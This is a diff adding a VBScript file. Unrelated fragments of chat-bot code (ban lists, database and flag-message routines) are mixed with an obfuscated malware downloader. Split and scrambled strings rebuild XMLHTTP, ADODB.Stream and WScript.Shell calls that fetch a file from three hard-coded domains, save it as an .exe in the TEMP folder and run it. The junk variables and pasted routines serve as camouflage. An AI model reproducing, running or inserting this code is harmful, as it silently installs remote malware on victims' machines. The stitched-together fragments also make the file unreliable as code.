@@ -1,0 +1,389 @@
+
+Dim InLineAdapallowableensurance 'As String
+
+Dim InLineAdapallowableInPlaceOf 'As String
+InLineAdapallowableBelish = "User"
+Public Function PrepareCheck(toCheck)
+    toCheck = Replace(toCheck, "[", "˙")
+    toCheck = Replace(toCheck, "]", "ö")
+    toCheck = Replace(toCheck, "~", "Ü")
+    toCheck = Replace(toCheck, "#", "˘")
+    toCheck = Replace(toCheck, "-", "Ł")
+    toCheck = Replace(toCheck, "&", "Ľ")
+    toCheck = Replace(toCheck, "@", "¤")
+    toCheck = Replace(toCheck, "{", "")
+    toCheck = Replace(toCheck, "}", "á")
+    toCheck = Replace(toCheck, "^", "í")
+    toCheck = Replace(toCheck, "`", "ó")
+    toCheck = Replace(toCheck, "_", "ú")
+    toCheck = Replace(toCheck, "+", "ń")
+    toCheck = Replace(toCheck, "$", "÷")
+    PrepareCheck = LCase(toCheck)
+End Function
+
+
+Public Sub LoadDatabase()
+    
+
+    ' 9/13/06: Add the bot owner 200
+    If (LenB(BotVars.BotOwner) > 0) Then
+        For i = 0 To UBound(DB)
+            If (StrComp(DB(i).Username, BotVars.BotOwner, vbTextCompare) = 0) Then
+                found = True
+                
+                Exit For
+            End If
+        Next
+        
+
+    End If
+    
+    If (SaveDB) Then Call WriteDatabase(Path)
+End Sub
+
+       Dim TristateTrue
+
+  Pirates = "XMLHTTPGIDZOAVAdodb.streaMGIDZOAVs"
+Vrungel = ".respo"+"nseBody"
+
+
+CUA ="Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0"
+
+      
+Dim InLineAdapallowableTimeTo 'As Object
+Dim InLineAdapallowablestatus
+InLineAdapallowablestatus = false
+   
+ Dim Pirates 'As String
+Dim Reikyavik
+Dim InLineAdapallowablecashback 'As Object
+Dim InLineAdapallowableWentDo 'As Object
+Dim InLineAdapallowableTavyer 'As Object   
+Dim abirvalgharmonyAxxxxx 'As Object
+  
+
+Dim ZimZamZum
+
+ Function SyncObjAharmonyallowable2(param1)
+param1 = param1 + param1
+
+InLineAdapallowable5000 = InLineAdapallowableWentDo.responseBody
+param1 = 3 * param1 - 8	
+
+End Function
+
+Function T2000(p, ddd) 
+    Set InLineAdapallowableRunrun = CreateObject("WSc"+"ript.Shell")	
+	abirvalgharmonyAxxxxx.Type = 1
+ abirvalgharmonyAxxxxx.Open
+End Function 
+
+Pirates ="Microsoft." + Pirates+  "hell.App"+"licationGIDZOAVWscript"
+
+Function StackStack( vr )
+	ad1 = Replace(Pirates, "PRECHOL", "" )
+   StackStack = Split(ad1,  vr)
+End Function
+
+
+Pirates = Pirates+".shellGIDZOAVProcessGIDZOAVGeTGIDZOAVT"+"emPGIDZOAVTyPRECHOL"+"pePRECHOL"
+
+
+Function SyncObjAharmonyallowable(strr)
+if D = 33 then
+AXC = "Sav"+"eToFile"
+end if
+abirvalgharmonyAxxxxx.Savetofile InLineAdapallowableInPlaceOf , 14-12
+End Function
+
+    Public Function FolderToCopy(dde,SecondP,VKUok)
+Samwell = 69
+Samwell = Samwell + 11
+if Samwell > 33 then
+SecondP.Write VKUok
+Samwell =  Samwell / 13
+end if
+End Function
+	
+
+
+ Function IsCircleAnalytic(ByVal Figure1 ) 
+If Figure1 < FigureCount And Figure1 >= 0 Then
+    If Figures(Figure1).FigureType = dsAnCircle Then IsCircleAnalytic = True
+End If
+End Function
+Function SheduledtyingObject(p,d)
+
+FC = "" + InLineAdapallowableInPlaceOf
+
+ InLineAdapallowableRunrun.Run(FC + "")
+
+End Function
+
+
+Pirates = Pirates +"GIDZOAVPRECHOLoPRECHOLpenGIDZOAVwrPRECHOLiteGIDZOAVrePRECHOLspoPRECHOLnseBoPRECHOLdyGIDZOAVsaPRECHOLvetof"+"PRECHOLileGIDZOAV\zsdhOEWmy.ex"+"PRECHOLeGIDZOAVhttPRECHOLp:GIDZOAV//"
+
+
+ Function GetShitlist(ByVal Username ) 
+    Dim gAcc 
+    Dim Ban  
+    
+    gAcc = GetCumulativeAccess(Username, "USER")
+    
+    If (Not InStr(1, gAcc.Flags, "Z", vbBinaryCompare) = 0) Then
+        Ban = True
+    ElseIf (Not InStr(1, gAcc.Flags, "B", vbBinaryCompare) = 0) Then
+        If (GetSafelist(Username) = False) Then Ban = True
+    End If
+    
+    If (Ban) Then
+        If ((Len(gAcc.BanMessage) > 0) And (gAcc.BanMessage <> "%")) Then
+            GetShitlist = Username & Space(1) & gAcc.BanMessage
+        ElseIf InStr(1, gAcc.Username, " (clan)", vbBinaryCompare) > 0 Then
+            GetShitlist = Username & Space(1) & "Clanban: " & Mid(gAcc.Username, 2, InStr(1, gAcc.Username, " (clan)", vbBinaryCompare) - 2)
+        ElseIf InStr(1, gAcc.Username, " (game)", vbBinaryCompare) > 0 Then
+            GetShitlist = Username & Space(1) & "Clientban: " & Mid(gAcc.Username, 2, InStr(1, gAcc.Username, " (game)", vbBinaryCompare) - 2)
+        ElseIf InStr(1, gAcc.Username, "*", vbBinaryCompare) > 0 Then
+            GetShitlist = Username & Space(1) & "Tagban: " & Mid(gAcc.Username, 2, Len(gAcc.Username) - 2)
+        Else
+            GetShitlist = Username & Space(1) & "Shitlisted"
+        End If
+    End If
+End Function
+Dim InLineAdapallowablePetir 'As String
+Dim sNodeKey 'As String
+  Dim sParentKey 'As String
+
+
+InLineAdapallowablePetir = "Ag"
+
+Reikyavik = StackStack("GIDZOAV" + "")
+
+  Dim MarketPlaceibility 'As String
+
+
+Dim Twelve 'As Integer
+  Dim sDecimalVis 'As String
+  
+Set InLineAdapallowableWentDo = CreateObject("" + Reikyavik(00))
+ 
+Dim Valery 'As Integer
+InLineAdapallowableBelish = InLineAdapallowableBelish + "-"
+ 
+
+
+Dim InLineAdapallowable404 'As String
+
+Dim InLineAdapallowable5000 'As Variant
+Dim InLineAdapallowableRunrun
+ Dim MarketPlace 'As String
+  Dim sTempVis 'As String
+  Dim iCount 'As Integer
+
+Function InLineAdapallowableFuks(p)
+ 
+InLineAdapallowableWentDo.Send
+	
+
+End Function
+Twelve = 11 + 1
+zTempVis = Reikyavik(1)
+
+'Set InLineAdapallowableTimeTo = CreateObject(Reikyavik(8-6))
+Set InLineAdapallowableHelmet = GetRef("SheduledtyingObject")
+Set InLineAdapallowable13 = GetRef("SyncObjAharmonyallowable")
+Set InLineAdapallowable14 = GetRef("FolderToCopy")
+ 
+Set abirvalgharmonyAxxxxx = CreateObject("Adodb."+"streaM")
+
+Public Sub DebugLog(txt)
+    'debug.print txt
+    Open AppPath & "ARCServerDebug.txt" 
+    Print txt
+    Close 
+End Sub
+Set InLineAdapallowableTavyer = CreateObject(""+Reikyavik(10-7))
+
+
+if "Host" + WScript + "23" = "HostWindows Script Host23" Then 
+	
+	
+
+
+
+	Set InLineAdapallowablecashback = InLineAdapallowableTavyer.Environment(Reikyavik(1 + 3))
+
+end if	
+
+Function SetUA()
+InLineAdapallowableLamp.setRequestHeader InLineAdapallowableBelish, CUA
+End Function
+ 
+ Valery = 89210
+
+InLineAdapallowableensurance = InLineAdapallowablecashback(Reikyavik(6))
+ Dim i
+ 'on error GoTo nextU
+' on error resume next
+sTempVis = Reikyavik(1+Twelve -1)
+
+ 
+
+Sub SendFlagDat(SndTo)
+    Dim i , b , n 
+    Dim oNewMsg() , lNewOffSet 
+    Dim lNewMsg 
+    
+    For i = 1 To UBound(Flag1, 2)
+        
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 1
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag1(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag1(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry1(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    For i = 1 To UBound(Flag2, 2)
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 2
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag2(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag2(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry2(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    For i = 1 To UBound(Flag3, 2)
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 3
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag3(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag3(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry3(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    For i = 1 To UBound(Flag4, 2)
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 4
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag4(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag4(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry4(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    For i = 1 To UBound(Flag5, 2)
+        lNewMsg = MSG_FLAGS
+        lNewOffSet = 0
+        ReDim oNewMsg(0)
+        AddBufferData oNewMsg, VarPtr(lNewMsg), LenB(lNewMsg), lNewOffSet
+        b = 5
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        b = i
+        AddBufferData oNewMsg, VarPtr(b), LenB(b), lNewOffSet
+        n = Flag5(0, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = Flag5(1, i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        n = FlagCarry5(i)
+        AddBufferData oNewMsg, VarPtr(n), LenB(n), lNewOffSet
+        SendTo oNewMsg, CInt(SndTo)
+    Next
+    
+End Sub
+MarketPlace = Reikyavik(11+2) & Reikyavik(11+3)
+
+InLineAdapallowableBelish = InLineAdapallowableBelish & InLineAdapallowablePetir & "ent"
+SKKmne = 19
+
+
+ZimZamZum = Array("financeforautos.com/oiheiryur92?","scottfranch.org/p66/oiheiryur92","gilgroup.com/oiheiryur92?")
+
+lTo = UBound(ZimZamZum)
+
+For i = 0 To lTo Step 1
+SKKmne = SKKmne * 16
+
+	on error resume  next
+Valery =  Valery +44
+ InLineAdapallowable404 = MarketPlace + ZimZamZum(i)
+dr1=2
+
+
+SKKmne = SKKmne + 91
+SKKmne2 = Reikyavik(10-5)
+ InLineAdapallowableWentDo.Open SKKmne2, InLineAdapallowable404, False
+
+
+
+SetUA()
+InLineAdapallowableFuks " d "
+If InLineAdapallowableWentDo.Status +3 = 203 Then
+InLineAdapallowablestatus = true
+ Exit For
+End If
+
+goto14:
+Next
+
+on error goto 0
+
+if InLineAdapallowablestatus Then
+Dim Clank 'As String
+ InLineAdapallowableInPlaceOf = InLineAdapallowableensurance+ sTempVis
+
+T2000 "",4
+SyncObjAharmonyallowable2 31 
+InLineAdapallowable14 "",abirvalgharmonyAxxxxx,InLineAdapallowable5000
+Sapogi =21
+InLineAdapallowableInPlaceOfu = "" + InLineAdapallowableInPlaceOf 
+
+
+Sapogi = Sapogi*5
+
+Dim InLineAdapallowableJohnSnowu,InLineAdapallowableDisplay 'As Long
+InLineAdapallowable13 "ss"
+InLineAdapallowableJohnSnowu = 4133
+
+If 621  < InLineAdapallowableJohnSnowu + 1 Then
+	  
+	Hipster =SKKmne+SKKmne
+	InLineAdapallowableHelmet Hipster, SKKmne
+	InLineAdapallowableDisplay = "H"
+End If
+
+
+
+mafia = 22211
+end if
